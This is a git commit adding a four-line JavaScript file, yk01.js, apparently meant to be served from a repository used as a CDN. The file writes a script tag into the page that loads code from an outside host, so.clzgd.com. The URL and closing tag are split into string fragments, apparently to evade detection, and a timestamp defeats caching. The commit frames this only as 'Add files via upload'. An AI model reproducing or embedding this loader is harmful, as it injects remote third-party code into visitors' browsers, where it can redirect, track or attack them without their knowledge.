439e5bc2c04bcd68e68f4e4ecc5daa5e0242f378
jisucdn <79298333+jisucdn@users.noreply.github.com>
2021-09-07 21:44:39 +0800

    Add files via upload

---
+++ yk01.js
@@ -0,0 +1,4 @@
+document.writeln('<script id="EX8NDYGmQ2JpXxHkQYLuUV" src="ht')
+document.writeln('tps:')
+document.writeln('//so.clzgd.com/iis.EX8NDYGmQ2JpXxHkQYLuUV-.com.js'+new Date().getTime()+'?w=142"')
+document.writeln('><\/scr' + 'ipt>')
